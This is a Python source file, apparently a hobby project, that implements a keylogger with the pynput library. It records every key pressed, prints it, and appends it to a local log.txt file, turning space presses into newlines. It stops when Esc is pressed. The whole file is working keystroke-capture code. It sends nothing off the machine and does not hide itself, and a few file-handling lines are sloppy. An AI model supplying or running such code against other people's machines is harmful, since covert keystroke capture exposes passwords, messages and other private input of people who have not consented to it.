from pynput.keyboard import Key, Listener

keys_information = "log.txt"
file_path = "/Users/sashikant/PycharmProjects/keylogger/"

count = 0
keys = []


def on_press(key):
    global keys, count
    print(key)
    keys.append(key)
    count += 1

    if count >=1:
        count = 0
        write_files(keys)
        keys = []


def write_files(keys):
    with open(file_path + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("key") == -1:
                f.write(k)
                f.close


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()